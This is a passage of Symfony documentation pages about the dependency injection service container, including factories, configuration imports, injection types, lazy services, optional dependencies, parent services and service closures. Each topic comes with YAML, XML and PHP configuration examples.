        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Email\NewsletterManagerFactory;
        use App\Email\NewsletterManagerInterface;

        return function(ContainerConfigurator $containerConfigurator) {
            $services = $containerConfigurator->services();

            $services->set(NewsletterManagerInterface::class)
                // use the "tracable_newsletter" service when debug is enabled, "newsletter" otherwise.
                ->factory(expr("parameter('kernel.debug') ? service('tracable_newsletter') : service('newsletter')"))
            ;

            // you can use the arg() function to retrieve an argument from the definition
            $services->set(NewsletterManagerInterface::class)
                ->factory(expr("arg(0).createNewsletterManager() ?: service('default_newsletter_manager')"))
                ->args([
                    service(NewsletterManagerFactory::class),
                ])
            ;
        };

.. _factories-passing-arguments-factory-method:

Passing Arguments to the Factory Method
---------------------------------------

.. tip::

    Arguments to your factory method are :ref:`autowired <services-autowire>` if
    that's enabled for your service.

If you need to pass arguments to the factory method you can use the ``arguments``
option. For example, suppose the ``createNewsletterManager()`` method in the
previous examples takes the ``templating`` service as an argument:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Email\NewsletterManager:
                factory:   ['@App\Email\NewsletterManagerFactory', createNewsletterManager]
                arguments: ['@templating']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\Email\NewsletterManager">
                    <factory service="App\Email\NewsletterManagerFactory" method="createNewsletterManager"/>
                    <argument type="service" id="templating"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Email\NewsletterManager;
        use App\Email\NewsletterManagerFactory;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(NewsletterManager::class)
                ->factory([service(NewsletterManagerFactory::class), 'createNewsletterManager'])
                ->args([service('templating')])
            ;
        };

.. _`factory design pattern`: https://en.wikipedia.org/wiki/Factory_(object-oriented_programming)
How to Import Configuration Files/Resources
===========================================

.. tip::

    In this section, service configuration files are referred to as *resources*.
    While most configuration resources are files (e.g. YAML, XML, PHP), Symfony is
    able to load configuration from anywhere (e.g. a database or even via an external
    web service).

The service container is built using a single configuration resource
(``config/services.yaml`` by default). This gives you absolute flexibility over
the services in your application.

External service configuration can be imported in two different ways. The first
method, commonly used to import other resources, is via the ``imports``
directive. The second method, using dependency injection extensions, is used by
third-party bundles to load the configuration. Read on to learn more about both
methods.

.. _service-container-imports-directive:

Importing Configuration with ``imports``
----------------------------------------

By default, service configuration lives in ``config/services.yaml``. But if that
file becomes large, you're free to organize into multiple files. Suppose you
decided to move some configuration to a new file:

.. configuration-block::

    .. code-block:: yaml

        # config/services/mailer.yaml
        parameters:
            # ... some parameters

        services:
            # ... some services

    .. code-block:: xml

        <!-- config/services/mailer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <parameters>
                <!-- ... some parameters -->
            </parameters>

            <services>
                <!-- ... some services -->
            </services>
        </container>

    .. code-block:: php

        // config/services/mailer.php

        // ... some parameters
        // ... some services

To import this file, use the ``imports`` key from any other file and pass either
a relative or absolute path to the imported file:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        imports:
            - { resource: services/mailer.yaml }
            # If you want to import a whole directory:
            - { resource: services/ }
        services:
            _defaults:
                autowire: true
                autoconfigure: true

            App\:
                resource: '../src/*'
                exclude: '../src/{DependencyInjection,Entity,Migrations,Tests,Kernel.php}'

            # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <imports>
                <import resource="services/mailer.xml"/>
                <!-- If you want to import a whole directory: -->
                <import resource="services/"/>
            </imports>

            <services>
                <defaults autowire="true" autoconfigure="true"/>

                <prototype namespace="App\" resource="../src/*"
                    exclude="../src/{DependencyInjection,Entity,Migrations,Tests,Kernel.php}"/>

                <!-- ... -->
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $container->import('services/mailer.php');
            // If you want to import a whole directory:
            $container->import('services/');

            $services = $container->services()
                ->defaults()
                    ->autowire()
                    ->autoconfigure()
            ;

            $services->load('App\\', '../src/*')
                ->exclude('../src/{DependencyInjection,Entity,Migrations,Tests,Kernel.php}');
        };

When loading a configuration file, Symfony loads first the imported files and
then it processes the parameters and services defined in the file. If you use the
:ref:`default services.yaml configuration <service-container-services-load-example>`
as in the above example, the ``App\`` definition creates services for classes
found in ``../src/*``. If your imported file defines services for those classes
too, they will be overridden.

A possible solution for this is to add the classes and/or directories of the
imported files in the ``exclude`` option of the ``App\`` definition. Another
solution is to not use imports and add the service definitions in the same file,
but after the ``App\`` definition to override it.

.. include:: /components/dependency_injection/_imports-parameters-note.rst.inc

.. _service-container-extension-configuration:

Importing Configuration via Container Extensions
------------------------------------------------

Third-party bundle container configuration, including Symfony core services,
are usually loaded using another method: a :doc:`container extension </bundles/extension>`.

Internally, each bundle defines its services in files like you've seen so far.
However, these files aren't imported using the ``import`` directive. Instead, bundles
use a *dependency injection extension* to load the files automatically. As soon
as you enable a bundle, its extension is called, which is able to load service
configuration files.

In fact, each configuration file in ``config/packages/`` is passed to the
extension of its related  bundle - e.g. ``FrameworkBundle`` or ``TwigBundle`` -
and used to configure those services further.
Types of Injection
==================

Making a class's dependencies explicit and requiring that they be injected
into it is a good way of making a class more reusable, testable and decoupled
from others.

There are several ways that the dependencies can be injected. Each injection
point has advantages and disadvantages to consider, as well as different
ways of working with them when using the service container.

Constructor Injection
---------------------

The most common way to inject dependencies is via a class's constructor.
To do this you need to add an argument to the constructor signature to accept
the dependency::

    // src/Mail/NewsletterManager.php
    namespace App\Mail;

    // ...
    class NewsletterManager
    {
        public function __construct(
            private MailerInterface $mailer,
        ) {
        }

        // ...
    }

You can specify what service you would like to inject into this in the
service container configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Mail\NewsletterManager:
                arguments: ['@mailer']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\Mail\NewsletterManager">
                    <argument type="service" id="mailer"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mail\NewsletterManager;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(NewsletterManager::class)
                ->args(service('mailer'));
        };

.. tip::

    Type hinting the injected object means that you can be sure that a suitable
    dependency has been injected. By type-hinting, you'll get a clear error
    immediately if an unsuitable dependency is injected. By type hinting
    using an interface rather than a class you can make the choice of dependency
    more flexible. And assuming you only use methods defined in the interface,
    you can gain that flexibility and still safely use the object.

There are several advantages to using constructor injection:

* If the dependency is a requirement and the class cannot work without it
  then injecting it via the constructor ensures it is present when the class
  is used as the class cannot be constructed without it.

* The constructor is only ever called once when the object is created, so
  you can be sure that the dependency will not change during the object's
  lifetime.

These advantages do mean that constructor injection is not suitable for
working with optional dependencies. It is also more difficult to use in
combination with class hierarchies: if a class uses constructor injection
then extending it and overriding the constructor becomes problematic.

Immutable-setter Injection
--------------------------

Another possible injection is to use a method which returns a separate instance
by cloning the original service, this approach allows you to make a service immutable::

    // src/Mail/NewsletterManager.php
    namespace App\Mail;

    // ...
    use Symfony\Component\Mailer\MailerInterface;
    use Symfony\Contracts\Service\Attribute\Required;

    class NewsletterManager
    {
        private MailerInterface $mailer;

        /**
         * @return static
         */
        #[Required]
        public function withMailer(MailerInterface $mailer): self
        {
            $new = clone $this;
            $new->mailer = $mailer;

            return $new;
        }

        // ...
    }

In order to use this type of injection, don't forget to configure it:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
       services:
            # ...

            app.newsletter_manager:
                class: App\Mail\NewsletterManager
                calls:
                    - withMailer: !returns_clone ['@mailer']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="https://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="app.newsletter_manager" class="App\Mail\NewsletterManager">
                    <call method="withMailer" returns-clone="true">
                        <argument type="service" id="mailer"/>
                    </call>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use App\Mail\NewsletterManager;
        use Symfony\Component\DependencyInjection\Reference;

        // ...
        $container->register('app.newsletter_manager', NewsletterManager::class)
            ->addMethodCall('withMailer', [new Reference('mailer')], true);

.. note::

    If you decide to use autowiring, this type of injection requires
    that you add a ``@return static`` docblock or the ``static`` return
    type in order for the container to be capable of registering
    the method.

This approach is useful if you need to configure your service according to your needs,
so, here's the advantages of immutable-setters:

* Immutable setters works with optional dependencies, this way, if you don't need
  a dependency, the setter doesn't need to be called.

* Like the constructor injection, using immutable setters force the dependency to stay
  the same during the lifetime of a service.

* This type of injection works well with traits as the service can be composed,
  this way, adapting the service to your application requirements is easier.

* The setter can be called multiple times, this way, adding a dependency to a collection
  becomes easier and allows you to add a variable number of dependencies.

The disadvantages are:

* As the setter call is optional, a dependency can be null when calling
  methods of the service. You must check that the dependency is available
  before using it.

* Unless the service is declared lazy, it is incompatible with services
  that reference each other in what are called circular loops.

Setter Injection
----------------

Another possible injection point into a class is by adding a setter method
that accepts the dependency::

    // src/Mail/NewsletterManager.php
    namespace App\Mail;

    use Symfony\Contracts\Service\Attribute\Required;

    // ...
    class NewsletterManager
    {
        private MailerInterface $mailer;

        #[Required]
        public function setMailer(MailerInterface $mailer): void
        {
            $this->mailer = $mailer;
        }

        // ...
    }

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            app.newsletter_manager:
                class: App\Mail\NewsletterManager
                calls:
                    - setMailer: ['@mailer']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="app.newsletter_manager" class="App\Mail\NewsletterManager">
                    <call method="setMailer">
                        <argument type="service" id="mailer"/>
                    </call>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mail\NewsletterManager;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(NewsletterManager::class)
                ->call('setMailer', [service('mailer')]);
        };

This time the advantages are:

* Setter injection works well with optional dependencies. If you do not
  need the dependency, then do not call the setter.

* You can call the setter multiple times. This is particularly useful if
  the method adds the dependency to a collection. You can then have a variable
  number of dependencies.

* Like the immutable-setter one, this type of injection works well with
  traits and allows you to compose your service.

The disadvantages of setter injection are:

* The setter can be called more than once, also long after initialization,
  so you cannot be sure the dependency is not replaced during the lifetime
  of the object (except by explicitly writing the setter method to check if
  it has already been called).

* You cannot be sure the setter will be called and so you need to add checks
  that any required dependencies are injected.

.. _property-injection:

Property Injection
------------------

Another possibility is setting public fields of the class directly::

    // ...
    class NewsletterManager
    {
        public MailerInterface $mailer;

        // ...
    }

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            app.newsletter_manager:
                class: App\Mail\NewsletterManager
                properties:
                    mailer: '@mailer'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="app.newsletter_manager" class="App\Mail\NewsletterManager">
                    <property name="mailer" type="service" id="mailer"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mail\NewsletterManager;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set('app.newsletter_manager', NewsletterManager::class)
                ->property('mailer', service('mailer'));
        };

There are mainly only disadvantages to using property injection, it is similar
to setter injection but with this additional important problem:

* You cannot control when the dependency is set at all, it can be changed
  at any point in the object's lifetime.

But, it is useful to know that this can be done with the service container,
especially if you are working with code that is out of your control, such
as in a third party library, which uses public properties for its dependencies.
Lazy Services
=============

.. seealso::

    Other ways to inject services lazily are via a :doc:`service closure </service_container/service_closures>` or
    :doc:`service subscriber </service_container/service_subscribers_locators>`.

Why Lazy Services?
------------------

In some cases, you may want to inject a service that is a bit heavy to instantiate,
but is not always used inside your object. For example, imagine you have
a ``NewsletterManager`` and you inject a ``mailer`` service into it. Only
a few methods on your ``NewsletterManager`` actually use the ``mailer``,
but even when you don't need it, a ``mailer`` service is always instantiated
in order to construct your ``NewsletterManager``.

Configuring lazy services is one answer to this. With a lazy service, a
"proxy" of the ``mailer`` service is actually injected. It looks and acts
like the ``mailer``, except that the ``mailer`` isn't actually instantiated
until you interact with the proxy in some way.

.. caution::

    Lazy services do not support `final`_ or ``readonly`` classes, but you can use
    `Interface Proxifying`_ to work around this limitation.

    In PHP versions prior to 8.0 lazy services do not support parameters with
    default values for built-in PHP classes (e.g. ``PDO``).

.. _lazy-services_configuration:

Configuration
-------------

You can mark the service as ``lazy`` by manipulating its definition:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Twig\AppExtension:
                lazy: true

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Twig\AppExtension" lazy="true"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Twig\AppExtension;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(AppExtension::class)->lazy();
        };

Once you inject the service into another service, a lazy ghost object with the
same signature of the class representing the service should be injected. A lazy
`ghost object`_ is an object that is created empty and that is able to initialize
itself when being accessed for the first time). The same happens when calling
``Container::get()`` directly.

To check if your lazy service works you can check the interface of the received object::

    dump(class_implements($service));
    // the output should include "Symfony\Component\VarExporter\LazyObjectInterface"

You can also configure your service's laziness thanks to the
:class:`Symfony\\Component\\DependencyInjection\\Attribute\\Autoconfigure` attribute.
For example, to define your service as lazy use the following::

    namespace App\Twig;

    use Symfony\Component\DependencyInjection\Attribute\Autoconfigure;
    use Twig\Extension\ExtensionInterface;

    #[Autoconfigure(lazy: true)]
    class AppExtension implements ExtensionInterface
    {
        // ...
    }

You can also configure laziness when your service is injected with the
:class:`Symfony\\Component\\DependencyInjection\\Attribute\\Autowire` attribute::

    namespace App\Service;

    use App\Twig\AppExtension;
    use Symfony\Component\DependencyInjection\Attribute\Autowire;

    class MessageGenerator
    {
        public function __construct(
            #[Autowire(service: 'app.twig.app_extension', lazy: true)] ExtensionInterface $extension
        ) {
            // ...
        }
    }

This attribute also allows you to define the interfaces to proxy when using
laziness, and supports lazy-autowiring of union types::

    public function __construct(
        #[Autowire(service: 'foo', lazy: FooInterface::class)]
        FooInterface|BarInterface $foo,
    ) {
    }

Another possibility is to use the :class:`Symfony\\Component\\DependencyInjection\\Attribute\\Lazy` attribute::

    namespace App\Twig;

    use Symfony\Component\DependencyInjection\Attribute\Lazy;
    use Twig\Extension\ExtensionInterface;

    #[Lazy]
    class AppExtension implements ExtensionInterface
    {
        // ...
    }

This attribute can be applied to both class and parameters that should be lazy-loaded.
It defines an optional parameter used to define interfaces for proxy and intersection types::

    public function __construct(
        #[Lazy(FooInterface::class)]
        FooInterface|BarInterface $foo,
    ) {
    }

.. versionadded:: 7.1

    The ``#[Lazy]`` attribute was introduced in Symfony 7.1.

Interface Proxifying
--------------------

Under the hood, proxies generated to lazily load services inherit from the class
used by the service. However, sometimes this is not possible at all (e.g. because
the class is `final`_ and can not be extended) or not convenient.

To workaround this limitation, you can configure a proxy to only implement
specific interfaces.

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Twig\AppExtension:
                lazy: 'Twig\Extension\ExtensionInterface'
                # or a complete definition:
                lazy: true
                tags:
                    - { name: 'proxy', interface: 'Twig\Extension\ExtensionInterface' }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Twig\AppExtension" lazy="Twig\Extension\ExtensionInterface"/>
                <!-- or a complete definition: -->
                <service id="App\Twig\AppExtension" lazy="true">
                    <tag name="proxy" interface="Twig\Extension\ExtensionInterface"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Twig\AppExtension;
        use Twig\Extension\ExtensionInterface;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(AppExtension::class)
                ->lazy()
                ->tag('proxy', ['interface' => ExtensionInterface::class])
            ;
        };

Just like in the :ref:`Configuration <lazy-services_configuration>` section, you can
use the :class:`Symfony\\Component\\DependencyInjection\\Attribute\\Autoconfigure`
attribute to configure the interface to proxify by passing its FQCN as the ``lazy``
parameter value::

    namespace App\Twig;

    use Symfony\Component\DependencyInjection\Attribute\Autoconfigure;
    use Twig\Extension\ExtensionInterface;

    #[Autoconfigure(lazy: ExtensionInterface::class)]
    class AppExtension implements ExtensionInterface
    {
        // ...
    }

The virtual `proxy`_ injected into other services will only implement the
specified interfaces and will not extend the original service class, allowing to
lazy load services using `final`_ classes. You can configure the proxy to
implement multiple interfaces by adding new "proxy" tags.

.. tip::

    This feature can also act as a safe guard: given that the proxy does not
    extend the original class, only the methods defined by the interface can
    be called, preventing to call implementation specific methods. It also
    prevents injecting the dependency at all if you type-hinted a concrete
    implementation instead of the interface.

.. _`ghost object`: https://en.wikipedia.org/wiki/Lazy_loading#Ghost
.. _`final`: https://www.php.net/manual/en/language.oop5.final.php
.. _`proxy`: https://en.wikipedia.org/wiki/Proxy_pattern
How to Make Service Arguments/References Optional
=================================================

Sometimes, one of your services may have an optional dependency, meaning
that the dependency is not required for your service to work properly. You can
configure the container to not throw an error in this case.

Setting Missing Dependencies to null
------------------------------------

You can use the ``null`` strategy to explicitly set the argument to ``null``
if the service does not exist:

.. configuration-block::

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\Newsletter\NewsletterManager">
                    <argument type="service" id="logger" on-invalid="null"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Newsletter\NewsletterManager;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(NewsletterManager::class)
                ->args([service('logger')->nullOnInvalid()]);
        };

.. note::

    The "null" strategy is not currently supported by the YAML driver.

Ignoring Missing Dependencies
-----------------------------

The behavior of ignoring missing dependencies is the same as the "null" behavior
except when used within a method call, in which case the method call itself
will be removed.

In the following example the container will inject a service using a method
call if the service exists and remove the method call if it does not:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Newsletter\NewsletterManager:
                calls:
                    - setLogger: ['@?logger']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Newsletter\NewsletterManager">
                    <call method="setLogger">
                        <argument type="service" id="logger" on-invalid="ignore"/>
                    </call>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Newsletter\NewsletterManager;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(NewsletterManager::class)
                ->call('setLogger', [service('logger')->ignoreOnInvalid()])
            ;
        };

.. note::

    If the argument to the method call is a collection of arguments and any of
    them is missing, those elements are removed but the method call is still
    made with the remaining elements of the collection.

In YAML, the special ``@?`` syntax tells the service container that the
dependency is optional. The ``NewsletterManager`` must also be rewritten by
adding a ``setLogger()`` method::

        public function setLogger(LoggerInterface $logger): void
        {
            // ...
        }
How to Manage Common Dependencies with Parent Services
======================================================

As you add more functionality to your application, you may well start to
have related classes that share some of the same dependencies. For example,
you may have multiple repository classes which need the
``doctrine.orm.entity_manager`` service and an optional ``logger`` service::

    // src/Repository/BaseDoctrineRepository.php
    namespace App\Repository;

    use Doctrine\ORM\EntityManager;
    use Psr\Log\LoggerInterface;

    // ...
    abstract class BaseDoctrineRepository
    {
        protected LoggerInterface $logger;

        public function __construct(
            protected EntityManager $entityManager,
        ) {
        }

        public function setLogger(LoggerInterface $logger): void
        {
            $this->logger = $logger;
        }

        // ...
    }

Your child service classes may look like this::

    // src/Repository/DoctrineUserRepository.php
    namespace App\Repository;

    use App\Repository\BaseDoctrineRepository;

    // ...
    class DoctrineUserRepository extends BaseDoctrineRepository
    {
        // ...
    }

    // src/Repository/DoctrinePostRepository.php
    namespace App\Repository;

    use App\Repository\BaseDoctrineRepository;

    // ...
    class DoctrinePostRepository extends BaseDoctrineRepository
    {
        // ...
    }

The service container allows you to extend parent services in order to
avoid duplicated service definitions:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Repository\BaseDoctrineRepository:
                abstract:  true
                arguments: ['@doctrine.orm.entity_manager']
                calls:
                    - setLogger: ['@logger']

            App\Repository\DoctrineUserRepository:
                # extend the App\Repository\BaseDoctrineRepository service
                parent: App\Repository\BaseDoctrineRepository

            App\Repository\DoctrinePostRepository:
                parent: App\Repository\BaseDoctrineRepository

            # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Repository\BaseDoctrineRepository" abstract="true">
                    <argument type="service" id="doctrine.orm.entity_manager"/>

                    <call method="setLogger">
                        <argument type="service" id="logger"/>
                    </call>
                </service>

                <!-- extends the App\Repository\BaseDoctrineRepository service -->
                <service id="App\Repository\DoctrineUserRepository"
                    parent="App\Repository\BaseDoctrineRepository"
                />

                <service id="App\Repository\DoctrinePostRepository"
                    parent="App\Repository\BaseDoctrineRepository"
                />

                <!-- ... -->
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Repository\BaseDoctrineRepository;
        use App\Repository\DoctrinePostRepository;
        use App\Repository\DoctrineUserRepository;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(BaseDoctrineRepository::class)
                ->abstract()
                ->args([service('doctrine.orm.entity_manager')])
                ->call('setLogger', [service('logger')])
            ;

            $services->set(DoctrineUserRepository::class)
                // extend the App\Repository\BaseDoctrineRepository service
                ->parent(BaseDoctrineRepository::class)
            ;

            $services->set(DoctrinePostRepository::class)
                ->parent(BaseDoctrineRepository::class)
            ;
        };

In this context, having a ``parent`` service implies that the arguments
and method calls of the parent service should be used for the child services.
Specifically, the ``EntityManager`` will be injected and ``setLogger()`` will
be called when ``App\Repository\DoctrineUserRepository`` is instantiated.

All attributes on the parent service are shared with the child **except** for
``shared``, ``abstract`` and ``tags``. These are *not* inherited from the parent.

.. tip::

    In the examples shown, the classes sharing the same configuration also
    extend from the same parent class in PHP. This isn't necessary at all.
    You can also extract common parts of similar service definitions into
    a parent service without also extending a parent class in PHP.

Overriding Parent Dependencies
------------------------------

There may be times where you want to override what service is injected for
one child service only. You can override most settings by specifying it in
the child class:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Repository\DoctrineUserRepository:
                parent: App\Repository\BaseDoctrineRepository

                # overrides the private setting of the parent service
                public: true

                # appends the '@app.username_checker' argument to the parent
                # argument list
                arguments: ['@app.username_checker']

            App\Repository\DoctrinePostRepository:
                parent: App\Repository\BaseDoctrineRepository

                # overrides the first argument (using the special index_N key)
                arguments:
                    index_0: '@doctrine.custom_entity_manager'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <!-- overrides the private setting of the parent service -->
                <service id="App\Repository\DoctrineUserRepository"
                    parent="App\Repository\BaseDoctrineRepository"
                    public="true"
                >
                    <!-- appends the '@app.username_checker' argument to the parent
                         argument list -->
                    <argument type="service" id="app.username_checker"/>
                </service>

                <service id="App\Repository\DoctrinePostRepository"
                    parent="App\Repository\BaseDoctrineRepository"
                >
                    <!-- overrides the first argument (using the index attribute) -->
                    <argument index="0" type="service" id="doctrine.custom_entity_manager"/>
                </service>

                <!-- ... -->
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Repository\BaseDoctrineRepository;
        use App\Repository\DoctrinePostRepository;
        use App\Repository\DoctrineUserRepository;
        // ...

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(BaseDoctrineRepository::class)
                // ...
            ;

            $services->set(DoctrineUserRepository::class)
                ->parent(BaseDoctrineRepository::class)

                // overrides the private setting of the parent service
                ->public()

                // appends the '@app.username_checker' argument to the parent
                // argument list
                ->args([service('app.username_checker')])
            ;

            $services->set(DoctrinePostRepository::class)
                ->parent(BaseDoctrineRepository::class)

                # overrides the first argument
                ->arg(0, service('doctrine.custom_entity_manager'))
            ;
        };
How to Retrieve the Request from the Service Container
======================================================

Whenever you need to access the current request in a service, you can either
add it as an argument to the methods that need the request or inject the
``request_stack`` service and access the ``Request`` by calling the
:method:`Symfony\\Component\\HttpFoundation\\RequestStack::getCurrentRequest`
method::

    // src/Newsletter/NewsletterManager.php
    namespace App\Newsletter;

    use Symfony\Component\HttpFoundation\RequestStack;

    class NewsletterManager
    {
        public function __construct(
            protected RequestStack $requestStack,
        ) {
        }

        public function anyMethod(): void
        {
            $request = $this->requestStack->getCurrentRequest();
            // ... do something with the request
        }

        // ...
    }

Now, inject the ``request_stack``, which behaves like any normal service.
If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
this will happen automatically via autowiring.

.. tip::

    In a controller you can get the ``Request`` object by having it passed in as an
    argument to your action method. See :ref:`controller-request-argument` for
    details.
Service Closures
================

This feature wraps the injected service into a closure allowing it to be
lazily loaded when and if needed.
This is useful if the service being injected is a bit heavy to instantiate
or is used only in certain cases.
The service is instantiated the first time the closure is called, while
all subsequent calls return the same instance, unless the service is
:doc:`not shared </service_container/shared>`::

    // src/Service/MyService.php
    namespace App\Service;

    use Symfony\Component\Mailer\MailerInterface;

    class MyService
    {
        /**
         * @param callable(): MailerInterface
         */
        public function __construct(
            private \Closure $mailer,
        ) {
        }

        public function doSomething(): void
        {
            // ...

            $this->getMailer()->send($email);
        }

        private function getMailer(): MailerInterface
        {
            return ($this->mailer)();
        }
    }

To define a service closure and inject it to another service, create an
argument of type ``service_closure``:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Service\MyService:
                arguments: [!service_closure '@mailer']

                # In case the dependency is optional
                # arguments: [!service_closure '@?mailer']

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
